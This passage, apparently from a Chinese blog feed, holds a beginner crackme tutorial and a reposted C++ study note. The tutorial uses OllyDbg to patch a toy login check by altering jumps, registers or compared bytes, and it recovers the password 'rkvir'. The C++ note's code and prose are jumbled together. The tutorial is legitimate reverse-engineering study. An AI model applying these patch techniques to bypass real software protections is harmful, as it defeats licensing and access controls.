Ctrl + G 输入十六进制地址，快速定位到该地址处
Ctrl + N 应用程序的输入表
Alt + B 显示断点窗口
Alt + C 显示 CPU 窗口
Alt + F9 执行到用户代码处，用于快速跳出系统函数
Ctrl+j跳转main函数
</code></pre>
<h2 id="寻找main函数od">寻找main函数(OD)</h2>
<p>1.寻找参考字符串<br>
2.main函数特点：3个push、1个call,F7进入。<br>
3.API寻找<br>
4.IDA</p>
<h2 id="修改内存中的数据">修改内存中的数据</h2>
<p>1.OD:右键-&gt;二进制-&gt;编辑<br>
2.修改PUSH的地址以及该地址中的数据</p>
<h2 id="修改跳转">修改跳转</h2>
<p>1.修改关键跳转<br>
2.修改对比值</p>
<h2 id="滑板指令">滑板指令</h2>
<p>nop/90； 作用：把自己过掉执行下一句</p>
<h2 id="初级破解">初级破解</h2>
<h3 id="找到main函数所在位置">找到main函数所在位置</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599047100466.png" alt="" loading="lazy"></figure>
<h3 id="整体main函数">整体main函数</h3>
<pre><code>00181080  /$  55            push ebp
00181081  |.  8BEC          mov ebp,esp
00181083  |.  83EC 38       sub esp,0x38
00181086  |.  A1 04F01900   mov eax,dword ptr ds:[0x19F004]
0018108B  |.  33C5          xor eax,ebp
0018108D  |.  8945 FC       mov [local.1],eax
00181090  |.  68 A8D61900   push 05.0019D6A8
00181095  |.  E8 86FFFFFF   call 05.00181020
0018109A  |.  6A 32         push 0x32
0018109C  |.  8D45 C8       lea eax,[local.14]
0018109F  |.  6A 00         push 0x0
001810A1  |.  50            push eax
001810A2  |.  E8 790D0000   call 05.00181E20
001810A7  |.  8D45 C8       lea eax,[local.14]
001810AA  |.  50            push eax
001810AB  |.  68 B8D61900   push 05.0019D6B8                         ;  &quot;%s&quot;
001810B0  |.  E8 9BFFFFFF   call 05.00181050
001810B5  |.  8B45 C8       mov eax,[local.14]
001810B8  |.  33D2          xor edx,edx
001810BA  |.  83C4 18       add esp,0x18
001810BD  |.  3C 72         cmp al,0x72
001810BF  |.  0F94C2        sete dl
001810C2  |.  80FC 6B       cmp ah,0x6B
001810C5  |.  8D4A 01       lea ecx,dword ptr ds:[edx+0x1]
001810C8  |.  0F45CA        cmovne ecx,edx
001810CB  |.  807D CA 76    cmp byte ptr ss:[ebp-0x36],0x76
001810CF  |.  8D41 01       lea eax,dword ptr ds:[ecx+0x1]
001810D2  |.  0F45C1        cmovne eax,ecx
001810D5  |.  807D CB 69    cmp byte ptr ss:[ebp-0x35],0x69
001810D9  |.  8D48 01       lea ecx,dword ptr ds:[eax+0x1]
001810DC  |.  0F45C8        cmovne ecx,eax
001810DF  |.  807D CC 72    cmp byte ptr ss:[ebp-0x34],0x72
001810E3  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]
001810E6  |.  0F45D1        cmovne edx,ecx
001810E9  |.  807D CD 00    cmp byte ptr ss:[ebp-0x33],0x0
001810ED  |.  8D42 01       lea eax,dword ptr ds:[edx+0x1]
001810F0  |.  0F45C2        cmovne eax,edx
001810F3  |.  83F8 05       cmp eax,0x5
001810F6  |.  76 07         jbe short 05.001810FF
001810F8  |.  68 BCD61900   push 05.0019D6BC                         ;  ASCII 6C,&quot;ogin sucess!\n&quot;
001810FD  |.  EB 05         jmp short 05.00181104
001810FF  |&gt;  68 CCD61900   push 05.0019D6CC                         ;  ASCII 6C,&quot;ogin failed!\n&quot;
00181104  |&gt;  E8 17FFFFFF   call 05.00181020
00181109  |.  83C4 04       add esp,0x4
0018110C  |.  68 DCD61900   push 05.0019D6DC                         ;  ASCII 70,&quot;ause&quot;
00181111  |.  E8 892A0000   call 05.00183B9F
00181116  |.  8B4D FC       mov ecx,[local.1]
00181119  |.  83C4 04       add esp,0x4
0018111C  |.  33CD          xor ecx,ebp
0018111E  |.  33C0          xor eax,eax
00181120  |.  E8 04000000   call 05.00181129
00181125  |.  8BE5          mov esp,ebp
00181127  |.  5D            pop ebp                                  ;  05.001812F1
00181128  \.  C3            retn

</code></pre>
<p>单步调试一遍</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1599047110988.png" alt="" loading="lazy"></figure>
<p>到这个位置显示请输入密码，随便敲一串字符继续调试</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1599047118404.png" alt="" loading="lazy"></figure>
<p>调试到此处显示登录失败</p>
<h3 id="破解方法">破解方法</h3>
<h4 id="方法1修改跳转">方法1：修改跳转</h4>
<p>经过初次调试可知00181020为printf，并添加各行作用注释</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1599047124421.png" alt="" loading="lazy"></figure>
<p>意思为eax&gt;5时，即上述对比字符串都相同时登录成功输出login success；<br>
过程：eax&gt;5，不执行jbe跳转，将login success压栈，跳转到call print函数位置；</p>
<p><img src="https://7usai.github.io/post-images/1599047131428.png" alt="" loading="lazy"><br>
修改后我们让它直接跳转到压栈位置。</p>
<h4 id="方法2修改关键字">方法2：修改关键字</h4>
<p>这里我们可知关键值时为eax，eax与5比较，大于5时才输出login success</p>
<p><img src="https://7usai.github.io/post-images/1599047137396.png" alt="" loading="lazy"><br>
我们在这里将eax值修改为大于5的数</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1599047146195.png" alt="" loading="lazy"></figure>
<h4 id="方法3分析得password">方法3：分析得password</h4>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1599047156075.png" alt="" loading="lazy"></figure>
<p>我们在这里可知，与0x72,0x6B,0x76,0x69,0x72,0x0做了对比相同则登录成功，于是密码为</p>
<p>思路：push eax 将输入的值存入了eax，ecx,edx两个中间值辅助eax+1.<br>
<img src="https://7usai.github.io/post-images/1599047162183.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1599047167384.png" alt="" loading="lazy"></figure>
<p>得到密码rkvir，成功</p>
<h4 id="方法4修改对比值">方法4：修改对比值</h4>
<p>即修改0x72,0x6B,0x76,0x69,0x72，让其与我们输入的值相同，即将我们输入的值变成password。</p>
<p>假如我们输入7usai就要改成0x37,0x75,0x73,0x61,0x69</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1599047173916.png" alt="" loading="lazy"></figure>
<p>登录成功</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1599047179674.png" alt="" loading="lazy"></figure>
<h2 id="mfc破解初试">MFC破解初试</h2>
<h3 id="初始界面">初始界面</h3>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1599295190085.png" alt="" loading="lazy"></figure>
<h3 id="修改跳转-2">修改跳转</h3>
<p><img src="https://7usai.github.io/post-images/1599295199199.png" alt="" loading="lazy"><br>
rkvir为密码已经可以看出，双击紫色行进入<br>
<img src="https://7usai.github.io/post-images/1599295206191.png" alt="" loading="lazy"><br>
修改跳转<br>
<img src="https://7usai.github.io/post-images/1599295211864.png" alt="" loading="lazy"></p>
<h3 id="修改密码">修改密码</h3>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1599295219313.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1599295225417.png" alt="" loading="lazy"></figure>
<h2 id="初试破解crakeme">初试破解CrakeMe</h2>
<p><img src="https://7usai.github.io/post-images/1599295232305.png" alt="" loading="lazy"><br>
需要弹出下面的消息框</p>
<h3 id="改跳转">改跳转</h3>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1599295239334.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1599295245091.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[C++学习（转载）]]></title>
        <id>https://7usai.github.io/post/cxue-xi-zhuan-zai/</id>
        <link href="https://7usai.github.io/post/cxue-xi-zhuan-zai/">
        </link>
        <updated>2020-09-01T14:41:23.000Z</updated>
        <content type="html"><![CDATA[<p><strong>C****艹学习笔记</strong></p>
<p>本笔记主干基于书籍《C艹面向对象程序设计教程(第4版)》，在此基础上会有所扩展。</p>
<p>内容如有不对之处，希望大家能够指出并私信我。</p>
<p>我的个人博客：https://www.kn0sky.com/</p>
<p>Web版笔记：https://wiki.kn0sky.com/#/note_cpp/README</p>
<p><strong>第一章：面向对象程序设计概述</strong></p>
<p><strong>面向过程与面向对象</strong></p>
<p>面向过程程序设计的主要特征是：程序由 过程定义 和 过程调用 组成</p>
<p>程序 = 过程 + 调用</p>
<p>面向对象程序设计的主要特征是：程序由类的定义和类的使用组成（一切消息由向对象发送消息来实</p>
<p>现，对象收到消息启动相关方法来完成）</p>
<p>程序 = 对象 + 消息</p>
<p><strong>面向对象程序设计基本概念</strong></p>
<p>对象：对象由数据和操作代码组成</p>
<p>类：类是一组对象的抽象</p>
<p>再程序设计中，先声明类，再声明对象</p>
<p>消息与方法：对象收到消息，调用相应的方法</p>
<p><strong>面向对象程序设计基本特征</strong></p>
<p>\1. 抽象：类是对象的抽象，对象是类的实例，抽象分为数据抽象和代码抽象，对应属性与方法</p>
<p>\2. 封装：把方法用函数包起来，使用的时候只需要知道需要的参数，提供了代码的重用性</p>
<p>\3. 继承：继承分为单继承和多继承，子类从单个或多个父类继承数据和方法，同时又与父类有所差别</p>
<p>\4. 多态：不同对象收到相同的消息时执行不同的操作</p>
<p>**第二章：****C++**<strong>概述</strong></p>
<p>C++语言的特点：全面兼容C，并对C进行了扩充</p>
<p><strong>注释行</strong></p>
<p>C++有两种注释方式：</p>
<p>//单行注释</p>
<p>/*多</p>
<p>行</p>
<p>注</p>
<p>释*/多行注释可以嵌套单行注释( // )的注释方式。</p>
<p><strong>C++</strong> <strong>的输入输出</strong></p>
<p>C++ 除了可以使用C语言中使用的 scanf() ， printf() 函数进行输入输出，还增加了使用标准输入流</p>
<p>对象 cin 和标准输出流对象 cout 来进行。</p>
<p>程序示例：</p>
<p>cin反汇编程序：</p>
<p>cout反汇编程序：</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>int a;</p>
<p>cin &gt;&gt; a;</p>
<p>cout &lt;&lt; a;</p>
<p>return 0;</p>
<p>}</p>
<p>int a;</p>
<p>cin &gt;&gt; a;</p>
<p>006718D2 mov esi,esp</p>
<p>;这里将esp栈顶指针放入esi存起来</p>
<p>006718D4 lea eax,[a]</p>
<p>006718D7 push eax</p>
<p>;取变量a的地址放入栈中</p>
<p>006718D8 mov ecx,dword ptr [<em>imp</em>?cin@std@@3V?$basic_istream@DU?</p>
<p>$char_traits@D@std@@@1@A (067B0ACh)]</p>
<p>006718DE call dword ptr</p>
<p>[__imp_std::basic_istream&lt;char,std::char_traits<char> &gt;::operator&gt;&gt; (067B098h)]</p>
<p>;这里把一个地址的值放到了ecx里，函数调用之后，我们输入数值，数值会存到那个地址里，从而使ecx里的</p>
<p>值变成了我们输入的结果</p>
<p>006718E4 cmp esi,esp</p>
<p>006718E6 call __RTC_CheckEsp (0671235h)</p>
<p>;对比当前栈和函数调用之前是否有变化，检查堆栈平衡</p>
<p>cout &lt;&lt; a;</p>
<p>005447BB mov esi,esp</p>
<p>;存栈顶</p>
<p>005447BD mov eax,dword ptr [a]</p>
<p>005447C0 push eax</p>
<p>;变量a入栈</p>
<p>005447C1 mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (054B0B0h)]</p>
<p>;不懂，可能是存储打印是否成功的005447C7 call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (054B0A4h)]</p>
<p>;函数调用打印变量的值</p>
<p>005447CD cmp esi,esp</p>
<p>005447CF call __RTC_CheckEsp (0541235h)</p>
<p>;堆栈平衡检查</p>
<p>return 0;</p>
<p>运算符 &gt;&gt; , &lt;&lt; 仍然保持C语言中右移、左移的功能，再用于输入输出时，进行了扩充 cin , cout ，运行</p>
<p>用户输入和输出一连串数据，示例：</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>int a, b, c;</p>
<p>cin &gt;&gt; a &gt;&gt;b &gt;&gt; c;</p>
<p>cout &lt;&lt; a + b &lt;&lt; c;</p>
<p>return 0;</p>
<p>}</p>
<p>输入：需要使用空白符进行分隔（空格，TAB，回车都行）</p>
<p>1 2 3</p>
<p>输出：会从左到右进行输出</p>
<p>33</p>
<p>示例反汇编：</p>
<p>int a, b, c;</p>
<p>cin &gt;&gt; a &gt;&gt;b &gt;&gt; c;</p>
<p>00031882 mov esi,esp</p>
<p>00031884 lea eax,[c]</p>
<p>00031887 push eax</p>
<p>00031888 mov edi,esp</p>
<p>0003188A lea ecx,[b]</p>
<p>0003188D push ecx</p>
<p>0003188E mov ebx,esp</p>
<p>00031890 lea edx,[a]</p>
<p>00031893 push edx</p>
<p>;从右往左的顺序将地址依次入栈，每次入栈前都把栈顶的值取出来，分别放到esi，edi，ebx里</p>
<p>00031894 mov ecx,dword ptr [<em>imp</em>?cin@std@@3V?$basic_istream@DU?</p>
<p>$char_traits@D@std@@@1@A (03B0ACh)]</p>
<p>0003189A call dword ptr</p>
<p>[__imp_std::basic_istream&lt;char,std::char_traits<char> &gt;::operator&gt;&gt; (03B098h)]</p>
<p>000318A0 cmp ebx,esp</p>
<p>000318A2 call __RTC_CheckEsp (031235h)</p>
<p>;从键盘接收变量a，函数调用完会把ecx里存的那个地址放到eax里</p>
<p>000318A7 mov ecx,eax<strong>进制转换</strong></p>
<p>可以通过设置转换基数操纵符dec（十进制），hex（十六进制），oct（八进制）进行进制转换</p>
<p>示例：</p>
<p>反汇编：</p>
<p>000318A9 call dword ptr</p>
<p>[__imp_std::basic_istream&lt;char,std::char_traits<char> &gt;::operator&gt;&gt; (03B098h)]</p>
<p>000318AF cmp edi,esp</p>
<p>000318B1 call __RTC_CheckEsp (031235h)</p>
<p>;从键盘接收变量b</p>
<p>000318B6 mov ecx,eax</p>
<p>000318B8 call dword ptr</p>
<p>[__imp_std::basic_istream&lt;char,std::char_traits<char> &gt;::operator&gt;&gt; (03B098h)]</p>
<p>000318BE cmp esi,esp</p>
<p>000318C0 call __RTC_CheckEsp (031235h)</p>
<p>;从键盘接收变量c</p>
<p>cout &lt;&lt; a + b &lt;&lt; c;</p>
<p>000318C5 mov esi,esp</p>
<p>000318C7 mov eax,dword ptr [c]</p>
<p>000318CA push eax</p>
<p>;变量c放入栈中</p>
<p>000318CB mov ecx,dword ptr [a]</p>
<p>000318CE add ecx,dword ptr [b]</p>
<p>000318D1 mov edi,esp</p>
<p>000318D3 push ecx</p>
<p>;计算a+b然后放入栈中</p>
<p>000318D4 mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (03B0B0h)]</p>
<p>000318DA call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (03B0A4h)]</p>
<p>000318E0 cmp edi,esp</p>
<p>000318E2 call __RTC_CheckEsp (031235h)</p>
<p>;输出c的值，同cin，调用完函数后会把原来存到ecx的值放到eax里</p>
<p>000318E7 mov ecx,eax</p>
<p>000318E9 call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (03B0A4h)]</p>
<p>000318EF cmp esi,esp</p>
<p>000318F1 call __RTC_CheckEsp (031235h)</p>
<p>;输出a+b的值</p>
<p>return 0;</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>int a = 16;</p>
<p>cout &lt;&lt; hex &lt;&lt; a;</p>
<p>return 0;</p>
<p>}<strong>灵活的局部变量</strong></p>
<p>C语言中，局部变量都需要写在程序的最前面，C++中没有这个限制：</p>
<p>像这样在程序中间进行定义变量的行为，在C语言中会报错，在C++中可以正常编译</p>
<p><strong>结构名、联合名、枚举名可以直接作为类型名称</strong></p>
<p>在C语言中，声明了一个结构体，联合体或者枚举类型，在使用的时候，需要在定义变量前面加上结构</p>
<p>名、联合名、枚举名，C++则不需要：</p>
<p>int a = 16;</p>
<p>009520C8 mov dword ptr [a],10h</p>
<p>;赋值</p>
<p>cout &lt;&lt; hex &lt;&lt; a;</p>
<p>009520CF mov esi,esp</p>
<p>009520D1 mov eax,dword ptr [a]</p>
<p>009520D4 push eax</p>
<p>;a入栈</p>
<p>009520D5 mov edi,esp</p>
<p>009520D7 push offset std::basic_ostream&lt;char,std::char_traits<char></p>
<p>&gt;::sentry::sentry (09511F4h)</p>
<p>;类型入栈</p>
<p>009520DC mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (095D0DCh)]</p>
<p>009520E2 call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (095D0A4h)]</p>
<p>009520E8 cmp edi,esp</p>
<p>009520EA call __RTC_CheckEsp (095128Fh)</p>
<p>;计算进制转换结果，但不知道保存在哪里了</p>
<p>009520EF mov ecx,eax</p>
<p>009520F1 call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (095D0A0h)]</p>
<p>009520F7 cmp esi,esp</p>
<p>009520F9 call __RTC_CheckEsp (095128Fh)</p>
<p>;打印输出</p>
<p>return 0;</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>int a = 16;</p>
<p>cout &lt;&lt; dec &lt;&lt; a;</p>
<p>int b;</p>
<p>cin &gt;&gt; b;</p>
<p>return 0;</p>
<p>}<strong>const</strong> <strong>修饰符</strong></p>
<p>C语言中常用 #define 来定义常量，这种方法是在编译的时候进行字符替换，不占用存储单元</p>
<p>C++提供了一种新的方法来定义常量： const 如：</p>
<p>这个常量是有类型，占用存储单元，有地址，可以被指向的，但不能修改。</p>
<p>如果 const 定义的是一个整型常量，关键词int可以忽略。</p>
<p>函数的形参也可以用const说明。</p>
<p><strong>const****与指针：指向常量的指针</strong></p>
<p>声明的常量的值不能改变，但指针可以改变指向</p>
<p><strong>const****与指针：常指针</strong></p>
<p>指针的地址不能改变，指针指的值可以变</p>
<p><strong>const****与指针：指向常量的常指针</strong></p>
<p>enum Bool{FALSE,TRUE};</p>
<p>Bool done;//C++可以这样定义</p>
<p>enum Bool done; //C需要这样定义</p>
<p>const int LIMIT = 99;</p>
<p>const LIMIT =100;//两行等价</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>const char* name = &quot;chen&quot;; //声明一个指向常量的指针</p>
<p>// name[3] = 'a'; const声明的常量的值不能改变</p>
<p>name = &quot;hello&quot;; //指针指向的地址可以改变</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>char st1[] = &quot;hello&quot;;</p>
<p>char * const name = st1; //指向字符地址的常量指针</p>
<p>//常指针固定不能移动，但值可以修改</p>
<p>name[3] = '4';//可以改变内容</p>
<p>//name = &quot;asd&quot;; 不能改变地址</p>
<p>return 0;</p>
<p>}<strong>函数原型</strong></p>
<p>在调用函数之前需要进行函数原型声明</p>
<p>如果调用的函数在调用之前已经声明好了，则不用在做原型声明了</p>
<p>原型声明格式： 返回值类型 函数名（参数表）;</p>
<p>参数表可不包含参数的名字只留下类型（但写上名字更好辨认参数用途）</p>
<p>当参数表为空的时候，C与C++有所不同</p>
<p><strong>内联函数</strong></p>
<p>为了消除函数调用时的系统开销，来提高运行速度，引入了内联函数</p>
<p>在函数说明前冠以关键字 inline ，该函数就是内联函数</p>
<p>使用时，编译器会把形参变成实参，直接在调用处展开</p>
<p>内联函数内一般不能包含复杂控制语句如循环、判断。</p>
<p>例如：</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>char st1[] = &quot;hello&quot;;</p>
<p>const char * const name = st1; //常量常指针</p>
<p>//常指针固定不能移动，值也不能改</p>
<p>//name[3] = '4';//可以改变内容</p>
<p>//name = &quot;asd&quot;;// 不能改变地址</p>
<p>return 0;</p>
<p>}</p>
<p>//C语言用的函数声明</p>
<p>int add(int a,int b);</p>
<p>int add();</p>
<p>add();</p>
<p>int add(int,int)</p>
<p>//C:</p>
<p>int add(void);//参数表为空</p>
<p>int add(); //参数表可能有值</p>
<p>//C++</p>
<p>int add(void);</p>
<p>int add();</p>
<p>//都意味着参数表为空会被编译器改成：</p>
<p>理论上是这样的，但我这实际操作里通过反汇编发现内联函数没起作用（我的环境是VS2019）</p>
<p>网上查找资料显示，内联函数知识对编译器的建议，是否内联还得看编译器</p>
<p><strong>带有默认参数的函数</strong></p>
<p>C++允许函数实参和形参个数不同，方法就是在函数定义的时候或声明的时候给形参定义默认值。</p>
<p>当实参不足时，会使用默认值作为实参进行调用</p>
<p>提供默认值的参数应该放在函数参数表的右边，省略参数也只能从右边省略</p>
<p>如果函数定义在调用之前，则应该在函数定义中设置默认值</p>
<p>如果函数定义在调用之后，则应该在函数声明中设置默认值</p>
<p>例如：</p>
<p>反汇编：</p>
<p>inline add(int a,int b){</p>
<p>return a+b;</p>
<p>}</p>
<p>int main(){</p>
<p>int c = add(1,2);</p>
<p>return 0</p>
<p>}</p>
<p>int main(){</p>
<p>int c;</p>
<p>int a=1;</p>
<p>int b=2;</p>
<p>c=a+b;</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int power(int x,int y=2);</p>
<p>int main(){</p>
<p>int i = power(2);</p>
<p>int j = power(2, 3);</p>
<p>return 0;</p>
<p>}</p>
<p>int power(int x, int y) {</p>
<p>int res=1;</p>
<p>for (int i = 0; i &lt; y; i++)</p>
<p>res *= x;</p>
<p>return res;</p>
<p>}</p>
<p>int i = power(2);</p>
<p>00691848 push 2</p>
<p>0069184A push 2<strong>函数的重载</strong></p>
<p>C语言中，函数名必须时唯一的，哪怕相同功能不同类型的参数都不行，但C++可以</p>
<p>C++中，只要函数参数类型不同，或者参数个数不同，或者都有，则可以使用相同函数名</p>
<p>编译器会根据实参的类型和数量来判断调用哪个重载函数</p>
<p>反汇编分析：</p>
<p>0069184C call power (0691389h)</p>
<p>00691851 add esp,8</p>
<p>00691854 mov dword ptr [i],eax</p>
<p>;直接将默认值2入栈进行函数调用</p>
<p>int j = power(2, 3);</p>
<p>00691857 push 3</p>
<p>00691859 push 2</p>
<p>0069185B call power (0691389h)</p>
<p>00691860 add esp,8</p>
<p>00691863 mov dword ptr [j],eax</p>
<p>;按照函数参数逐个入栈进行调用</p>
<p>return 0;</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int mul(float a);</p>
<p>int mul(int a, int b);</p>
<p>int mul(int a, int b, int c);</p>
<p>int main(){</p>
<p>int a1 = mul(1.2);</p>
<p>int a2 = mul(1, 2);</p>
<p>int a3 = mul(1, 2, 3);</p>
<p>cout &lt;&lt; a1 &lt;&lt; ' ' &lt;&lt; a2 &lt;&lt; ' ' &lt;&lt; a3 &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>int mul(float a) {</p>
<p>return a * a;</p>
<p>}</p>
<p>int mul(int a, int b) {</p>
<p>return a * b;</p>
<p>}</p>
<p>int mul(int a, int b, int c) {</p>
<p>return a * b * c;</p>
<p>}</p>
<p>int a1 = mul(1.2);</p>
<p>009B2618 push ecx</p>
<p>009B2619 movss xmm0,dword ptr [__real@3f99999a (09B9B30h)]</p>
<p>009B2621 movss dword ptr [esp],xmm0</p>
<p>009B2626 call mul (09B10D2h)</p>
<p>009B262B add esp,4</p>
<p>009B262E mov dword ptr [a1],eax</p>
<p>;调用了mul:09B10D2h</p>
<p>int a2 = mul(1, 2);</p>
<p>009B2631 push 2</p>
<p>009B2633 push 1说明：</p>
<p>函数返回值不在参数匹配检查范围中，当两个函数只有返回值类型不同时，则不允许重载</p>
<p>函数的重载与带默认值的函数一起用会引起二义性</p>
<p>函数调用时，如果形参和实参类型不同，编译器会自动进行类型转换，转换成功，程序继续执行，</p>
<p>反之则报错</p>
<p><strong>作用域运算符</strong>：：</p>
<p>通常情况下，如果有两个同名变量，一个全局一个局部，那么局部变量在其作用域内拥有高优先级</p>
<p>在变量前面加上作用域运算符 :: 则可以使用全局变量</p>
<p><strong>无名联合</strong></p>
<p>无名联合时C++中的一种特殊联合，它在关键字 union 后面没有给出联合名</p>
<p>在访问无名联合时，不能访问无名联合变量，应该访问联合变量中的成员。</p>
<p><strong>强制类型转换</strong></p>
<p>C语言中的强制类型转换：</p>
<p>C++中的强制类型转换：</p>
<p>两种方法C++都能接收，建议使用后。</p>
<p><strong>运算符<strong><strong>new</strong></strong>和****delete</strong></p>
<p>C语言使用函数 malloc() 和 free() 动态分配内存，C++使用 new , delete</p>
<p>new使用的最基本形式： 指针变量名 = new 类型</p>
<p>在运行过程中，运算符从堆中为程序分配一块与类型大小相同的内存空间，并将内存首地址存于指针变</p>
<p>量中</p>
<p>009B2635 call mul (09B1285h)</p>
<p>009B263A add esp,8</p>
<p>009B263D mov dword ptr [a2],eax</p>
<p>;调用了mul:09B1285h</p>
<p>int a3 = mul(1, 2, 3);</p>
<p>009B2640 push 3</p>
<p>009B2642 push 2</p>
<p>009B2644 push 1</p>
<p>009B2646 call mul (09B1370h)</p>
<p>009B264B add esp,0Ch</p>
<p>009B264E mov dword ptr [a3],eax</p>
<p>;调用了mul:09B1370h</p>
<p>;三次调用了三个不同的函数地址</p>
<p>int i=10;</p>
<p>double a = (double)i;</p>
<p>int i=10;</p>
<p>double a = double(i);运算符delete用于释放运算符new所分配的内存空间，使用形式为： delete 指针变量名</p>
<p>new和malloc相比：</p>
<p>\1. malloc需要使用sizeof函数计算所需要的字节数，new会根据类型自动计算</p>
<p>\2. new能自动返回正确的指针类型，malloc需要进行强制类型转换</p>
<p>说明：</p>
<p>使用new可以为数组动态分配内存空间，只需要在类型名后面加上数组大小：</p>
<p>也可以为多维数组进行动态分配，但必须提供所有维度的大小，其中第一维度的值可以时任意合法</p>
<p>的正整数表达式</p>
<p>new为简单变量分配空间的同时可以进行初始化</p>
<p>但new不能对动态分配的数组进行初始化</p>
<p>释放动态分配数组空间时可用 [] 放到指针变量前来删除</p>
<p>new动态分配内存，当内存空间不足，分配失败，会返回空指针NULL</p>
<p><strong>引用</strong></p>
<p>引用用于给变量起别名。</p>
<p>声明一个引用时，必须同时用另一个变量的名字来将他初始化。</p>
<p>格式为： 类型 &amp;引用名 = 已定义的变量名</p>
<p>仅在声明时候的 &amp; 为引用声明符，其他地方均为取址符。</p>
<p>引用不另开内存单元，变量和引用占用同一个内存空间。</p>
<p>说明：</p>
<p>引用名可以使用任何合法的变量名，除了用作函数参数和返回类型外，在声明引用时必须立即进行</p>
<p>初始化</p>
<p>为引用提供的初始值可以是变量和另一个引用</p>
<p>引用在初始化之后不能被重新声明为另一个变量的引用</p>
<p>不是所有类型的数据都能引用，如下类型不能引用</p>
<p>int* p;</p>
<p>p = new int;</p>
<p>delete p;</p>
<p>int * pi = new int[10];</p>
<p>int * p = new int(12);</p>
<p>delete []p;</p>
<p>int i;</p>
<p>int&amp; j=i;不能建立void类型的引用</p>
<p>不能建立数组类型的引用</p>
<p>不能建立引用的引用</p>
<p>不能建立指向引用的指针（引用本身不是数据类型，没有指针）</p>
<p>可以将引用的地址赋值给指针，指针指向原来的变量</p>
<p><strong>引用作为函数参数</strong></p>
<p>引用的一个主要用途就是作为函数参数，在函数中要对实参进行改变，可以用指针来改变实参的内容，</p>
<p>也可以使用引用来直接对实参进行改变，使函数参数更清晰易懂。</p>
<p>例如：将a变量的值与b变量进行交换</p>
<p><strong>使用引用函数返回值</strong></p>
<p>使用引用可以返回函数的值，可以将函数调用放在赋值表达式的左边</p>
<p><strong>练手习题</strong></p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>void swap(int&amp; x, int&amp; y) {</p>
<p>int tmp;</p>
<p>tmp = x;</p>
<p>x = y;</p>
<p>y = tmp;</p>
<p>}</p>
<p>int main(){</p>
<p>int a = 5, b = 10;</p>
<p>cout &lt;&lt; a &lt;&lt; &quot; &quot; &lt;&lt; b &lt;&lt; endl;</p>
<p>swap(a, b);</p>
<p>cout &lt;&lt; a &lt;&lt; &quot; &quot; &lt;&lt; b &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>运行结果：</p>
<p>5 10</p>
<p>10 5</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int a[] = { 1,2,3,4,5 };</p>
<p>int&amp; index(int i) { //返回值为引用</p>
<p>return a[i];</p>
<p>}</p>
<p>int main(){</p>
<p>index(2) = 99; //返回的使a[2]的引用</p>
<p>cout &lt;&lt; index(2) &lt;&lt; endl;</p>
<p>cout &lt;&lt; a[2] &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}一、编写一个C++风格程序，解决百钱问题：将一元RMB兑换成1、2、5分的硬币，有几种换法？</p>
<p><strong>第三章：类和对象</strong></p>
<p>类是C++最强有力的特征。</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main(){</p>
<p>int sum = 0;</p>
<p>int coin1 = 100;</p>
<p>int coin2 = 50;</p>
<p>int coin5 = 20;</p>
<p>for (int i = 0; i &lt;= coin1; i++) {</p>
<p>for (int j = 0; j &lt;= coin2; j++) {</p>
<p>for (int k = 0; k &lt;= coin5; k++) {</p>
<p>if (i + 2 * j + 5 * k == 100) {</p>
<p>sum++;</p>
<p>cout &lt;&lt; &quot;一分硬币：&quot; &lt;&lt; i &lt;&lt; &quot; 二分硬币：&quot; &lt;&lt; j &lt;&lt; &quot; 五分硬币：&quot;</p>
